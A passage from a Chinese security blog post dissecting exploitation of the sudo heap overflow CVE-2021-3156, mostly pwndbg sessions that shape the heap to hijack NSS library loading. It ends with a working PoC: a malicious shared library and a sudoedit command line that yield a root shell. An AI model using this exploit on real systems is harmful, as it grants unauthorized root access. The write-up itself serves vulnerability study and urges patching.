+                unsortbin: 0x555f813d36f0 (size : 0xe60)
+             largebin[48]: 0x555f813d8680 (size : 0x2d20)
+             largebin[50]: 0x555f813d45a0 (size : 0x4010)
+    (0x20)   tcache_entry[0](1): 0x555f813d2e40
+    (0x40)   tcache_entry[2](2): 0x555f813c8770 --> 0x555f813c8460 // 0x555f813c87d0 已经被我们申请走了
+    (0x70)   tcache_entry[5](1): 0x555f813c7f80
+    (0x80)   tcache_entry[6](1): 0x555f813d8610
+    (0x100)   tcache_entry[14](1): 0x555f813cc9c0
+    (0x150)   tcache_entry[19](1): 0x555f813c8620
+    (0x180)   tcache_entry[22](1): 0x555f813c84a0
+    (0x1e0)   tcache_entry[28](1): 0x555f813d3370
+    pwndbg> b nss_load_library                                                                                   Breakpoint 3 at 0x7f0531c8c4c0: file nsswitch.c, line 329.
+    pwndbg> c
+    ...
+    pwndbg> p __nss_group_database 
+    $1 = (service_user *) 0x555f813c88c0
+    pwndbg> p sudo_user.cmnd_args                                                                                 $2 = 0x555f813c87d0 'x' <repeats 54 times>
+    pwndbg> p (void*)__nss_group_database - (void*)sudo_user.cmnd_args      
+    $38 = 240
+    pwndbg> p (void*)&__nss_group_database->library - (void*)sudo_user.cmnd_args                                 
+    $49 = 272
+    pwndbg> p (void*)__nss_group_database->name - (void*)sudo_user.cmnd_args                                     
+    $40 = 288
+    
+
+现在我们已经构造好了内存布局，接下来我们调整环境变量，实现修改 _nss_group_database
+{library、name}的值。如果要真正实现漏洞利用，需要将libary的值修改成NULL，name修改一个两个字节以上的字符串。根据漏洞特点连续的{‘\’
+‘\’ ‘\’ ‘\’ …}会溢出成一个连续0的内存空间，如果要修改libary为NULL，至少要连续八个‘\’
+以上，然后我们接着构造溢出参数，实现修改library的目的。
+
+    
+    
+    pwndbg> b set_cmnd 
+    Breakpoint 1 at 0x7fdc9f272fd0: file ./sudoers.c, line 922.
+    pwndbg> set env 1 xxxxx
+    pwndbg> r -s 'xxxxxx' 'x' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\'
+    ...
+    pwndbg> search -t string -s files
+    sudo            0x557da6f2f370 0x73656c6966 /* 'files' */
+    sudo            0x557da6f2f3b2 0x65730073656c6966 /* 'files' */
+    [heap]          0x557da7cd4190 0x73656c6966 /* 'files' */
+    [heap]          0x557da7cd68f0 0x73656c6966 /* 'files' */
+    [heap]          0x557da7cd6990 0x73656c6966 /* 'files' */
+    [heap]          0x557da7cd69f0 0x73656c6966 /* 'files' */
+    [heap]          0x557da7cd6a50 0x73656c6966 /* 'files' */
+    [heap]          0x557da7cd6b50 0x73656c6966 /* 'files' */
+    [heap]          0x557da7cd6c00 0x73656c6966 /* 'files' */
+    [heap]          0x557da7cd6cb0 0x73656c6966 /* 'files' */
+    [heap]          0x557da7cd6d50 0x73656c6966 /* 'files' */
+    [heap]          0x557da7cd6df0 0x73656c6966 /* 'files' */
+    sudoers.so      0x7f60ad46b339 0x73000073656c6966 /* 'files' */
+    libc-2.31.so    0x7f60adecd9c7 0x65540073656c6966 /* 'files' */
+    libc-2.31.so    0x7f60adececc5 0x6f680073656c6966 /* 'files' */
+    libc-2.31.so    0x7f60aded070e 0x652f0073656c6966 /* 'files' */
+    libc-2.31.so    0x7f60aded36a9 0x49000073656c6966 /* 'files' */
+    ld-2.31.so      0x7f60adf9216d 0x73656c6966 /* 'files' */
+    pwndbg> p *__nss_passwd_database
+    $1 = {
+      next = 0x557da7cd4440,
+      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN},
+      library = 0x557da7cd58f0,
+      known = 0x557da7cd58b0,
+      name = 0x557da7cd4190 "files"
+    }
+    pwndbg> p *(service_user *)(0x557da7cd68f0 - 0x30)                                                           $2 = {
+      next = 0x557da7cd6900,
+      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN},
+      library = 0x0,
+      known = 0x0,
+      name = 0x557da7cd68f0 "files"
+    }
+    pwndbg> hexdump 0x557da7cd68e0                                                                               +0000 0x557da7cd68e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
+    +0010 0x557da7cd68f0  66 69 6c 65  73 00 00 00  41 00 00 00  00 00 00 00  │file│s...│A...│....│
+    +0020 0x557da7cd6900  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
+    +0030 0x557da7cd6910  00 00 00 00  01 00 00 00  01 00 00 00  00 00 00 00  │....│....│....│....│
+    pwndbg> b sudoers.c:1014                                                           
+    Breakpoint 3 at 0x7fa8a7fcf19d: sudoers.c:1014. (2 locations)
+    pwndbg> c
+    ...
+    pwndbg> hexdump 0x557da7cd68e0
+    +0000 0x557da7cd68e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 31  │....│....│....│...1│
+    +0010 0x557da7cd68f0  3d 2f 78 78  78 78 20 00  00 00 00 00  00 00 00 00  │=xxx│xx..│....│....│
+    +0020 0x557da7cd6900  00 00 00 00  00 00 00 00  31 3d 2f 78  78 78 78 20  │....│....│1=xx│xxx.│
+    +0030 0x557da7cd6910  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
+    pwndbg> p *(service_user *)(0x557da7cd68f0 - 0x30)
+    $3 = {
+      next = 0x2078,
+      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, (unknown: 792539392), (unknown: 2021161080)},
+      library = 0x0,
+      known = 0x3100000000000000,
+      name = 0x557da7cd68f0 "=xxxxx "
+    }
+    pwndbg> c
+    Continuing.
+    Program received signal SIGSEGV, Segmentation fault.
+    __GI___tsearch (key=key@entry=0x7ffd5fbe59f8, vrootp=vrootp@entry=0x557da7cd68e8, compar=compar@entry=0x7f60ade5c090 <known_compare>) at tsearch.c:309
+    ───[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
+    00:0000│ rsp  0x7ffd5fbe5990 —▸ 0x7f60adecd36a ◂— 0x6225206125000200
+    01:0008│      0x7ffd5fbe5998 —▸ 0x7f60ade5c090 (known_compare) ◂— endbr64 
+    02:0010│      0x7ffd5fbe59a0 ◂— 0x0
+    03:0018│      0x7ffd5fbe59a8 —▸ 0x7f60ade5c8ec (__nss_database_lookup2+204) ◂— test   eax, eax
+    04:0020│      0x7ffd5fbe59b0 —▸ 0x557da7cdb308 ◂— 0x72007800746f6f72 /* 'root' */
+    05:0028│      0x7ffd5fbe59b8 —▸ 0x557da7cd68c0 ◂— 0x2078 /* 'x ' */
+    06:0030│      0x7ffd5fbe59c0 —▸ 0x7ffd5fbe5a40 ◂— 0x0
+    07:0038│      0x7ffd5fbe59c8 —▸ 0x7ffd5fbe5ac8 ◂— 0x10001
+    ───[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
+     ► f 0     7f60ade32d46 tsearch+54
+       f 1     7f60ade5ce51 __nss_lookup_function+97
+       f 2     7f60addf813f internal_getgrouplist+175
+       f 3     7f60addf83ed getgrouplist+109
+       f 4     7f60adf356b6 sudo_getgrouplist2_v1+198
+       f 5     7f60ad448433 sudo_make_gidlist_item+451
+       f 6     7f60ad4471de sudo_get_gidlist+286
+       f 7     7f60ad44051d runas_getgroups+93
+       f 8     7f60ad42f5e2 set_perms+1186
+       f 9     7f60ad42f5e2 set_perms+1186
+       f 10     7f60ad428c40 sudoers_lookup+112
+    pwndbg> f 1
+    #1  0x00007f60ade5ce51 in __GI___nss_lookup_function (ni=ni@entry=0x557da7cd68c0, fct_name=<optimized out>, fct_name@entry=0x7f60adece9d7 "initgroups_dyn") at nsswitch.c:428
+    428     nsswitch.c: No such file or directory.
+    pwndbg> p ni
+    $4 = (service_user *) 0x557da7cd68c0
+    pwndbg> p *ni
+    $5 = {
+      next = 0x2078,
+      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, (unknown: 792539392), (unknown: 2021161080)},
+      library = 0x0,
+      known = 0x3100000000000000,
+      name = 0x557da7cd68f0 "=xxxxx "
+    }
+    
+
+根据之前的方案分析，library修改为NULL，name修改成任意值应该，程序能运行到dlopen才对，不过事实证明不是这样的，于是我根据crash信息和源码，我发现不单要修改library为NULL，而且know也要修改为NULL，否则在执行tsearch会crash，根本运行不到nss_load_library的dlopen。接下来我们重新调整参数，修改library、know为NULL，name修改为任意字符串。
+
+    
+    
+    pwndbg> b set_cmnd 
+    Breakpoint 1 at 0x7fdc9f272fd0: file ./sudoers.c, line 922.
+    pwndbg> b nss_load_library                                                                                   Note: breakpoint 2 also set at pc 0x7f2c3b3194c0.
+    Breakpoint 2 at 0x7f2c3b3194c0: file nsswitch.c, line 329.
+    pwndbg> r -s 'xxxxxxx' 'x' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\'
+    ...
+    pwndbg> p *(service_user *)0x55baa82948c0
+    $1 = {
+      next = 0x207878,
+      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, (unknown: 1026621440), (unknown: 2021161080)},
+      library = 0x0,
+      known = 0x0,
+      name = 0x55baa82948f0 "1=xxxxx "
+    }
+    pwndbg> c
+    Continuing.
+    Breakpoint 2, nss_load_library (ni=ni@entry=0x55baa82948c0) at nsswitch.c:329
+    pwndbg> p *ni
+    $1 = {
+      next = 0x207878,
+      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, (unknown: 1026621440), (unknown: 2021161080)},
+      library = 0x0,
+      known = 0x55baa829eee0,
+      name = 0x55baa82948f0 "1=xxxxx "
+    }
+    pwndbg> ni
+    ...
+    pwndbg> 
+    0x00007f2c3b319627      359     in nsswitch.c
+    ───[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────
+       0x7f2c3b319611 <nss_load_library+337>    mov    esi, 0x80000002
+       0x7f2c3b319616 <nss_load_library+342>    mov    rdi, rsp
+       0x7f2c3b319619 <nss_load_library+345>    mov    dword ptr [rax], 0x6f732e
+       0x7f2c3b31961f <nss_load_library+351>    mov    byte ptr [rax + 5], 0
+       0x7f2c3b319623 <nss_load_library+355>    mov    word ptr [rax + 3], cx
+     ► 0x7f2c3b319627 <nss_load_library+359>    call   __libc_dlopen_mode <__libc_dlopen_mode>
+            rdi: 0x7fff12ac9fa0 ◂— 'libnss_1=xxxxx .so.2'
+            rsi: 0x80000002
+            rdx: 0x8
+            rcx: 0x322e
+    
+       0x7f2c3b31962c <nss_load_library+364>    mov    r10, qword ptr [rbp - 0x48]
+       0x7f2c3b319630 <nss_load_library+368>    mov    qword ptr [rbx + 8], rax
+       0x7f2c3b319634 <nss_load_library+372>    mov    rbx, qword ptr [r12 + 0x20]
+       0x7f2c3b319639 <nss_load_library+377>    cmp    qword ptr [rbx + 8], 0
+       0x7f2c3b31963e <nss_load_library+382>    je     nss_load_library+507 <nss_load_library+507>
+    
+
+我们修正好了参数，再次运行，发现已经可以同时修改library和known为NULL，这时我们继续调试程序，证明已经可以执行到nss_load_library的断点
+了，再查看ni是符合预期的，我们继续调试跟踪成到__libc_dlopen_mode之前，发先rdi第一参数是’libnss_1=xxxxx
+.so.2’。到这里我们已经可以sudo程序打开一个任意字符名的so了。
+
+​ 修改环境变量1的值为/xxxx，这样dlopen就会尝试打开一个 ‘libnss_1=/xxxx\
+.so.2’的动态库。我实现了一个简单的shellcode测试一下这个POC。
+
+    
+    
+    -> % id
+    uid=1002(test) gid=1002(test) groups=1002(test)
+    -> % mkdir -p libnss_1\=/
+    -> % cat << EOF | gcc -fPIC -shared -o libnss_1=/xxxx\ .so.2 -xc -    #include <unistd.h>
+    void __attribute__((constructor)) init() {
+        !setuid(0) && !setgid(0) && execl("/bin/sh", "sh", (char *) 0);
+    }
+    EOF
+    -> % tree
+    .
+    └── libnss_1=
+        └── xxxx .so.2
+    
+    1 directory, 1 file
+    -> % env -i 1=/xxxx LC_IDENTIFICATION=en_US.UTF-8@xxxxxxxxxxxxx /tmp/sudo/bin/sudoedit -s 'xxxxxxx' 'x' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\'
+    sh-5.0# id
+    uid=0(root) gid=0(root) groups=0(root),1002(test)
+    
+
+到此，这个POC已经实现了提权，接下来我会写一下自己的心得：
+
+  * 理解内存管理的原理和对抗策略（内存分配算法、缓存算法一直都在升级，到目前为止还有很多可以利用的“姿势”，以后我可能会整理一份相关的笔记）
+  * alsr只是随机化了内存基地址，在执行环境不变的情况下，反复执行同一个程序，各个内存变量之间的偏移是不变的。
+  * 要有依据的利用蛮力测试方法构造有效参数。（这个也是目前fuzzing测试的优化点）
+
+## 总结
+
+这个漏洞不是一个RCE漏洞，直接危害程度应该不会很大，间接危程度还是很高的，建议大家还是尽早修补了吧。
+
+引用
+
+  * <https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **nfalse** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/231420](/post/id/231420)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [漏洞利用](/tag/漏洞利用)
+  * [POC](/tag/POC)
+  * [SUDO](/tag/SUDO)
+  * [双倍活动](/tag/双倍活动)
+  * [CVE-2021-3156](/tag/CVE-2021-3156)
+
+ **+1** __9赞
+
+ __收藏
+
+![](https://p4.ssl.qhmsg.com/dm/48_48_100/t018779546973081d89.jpg?f=e7d531597a0bce2c56ec8531e36b9f1d)
+nfalse
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
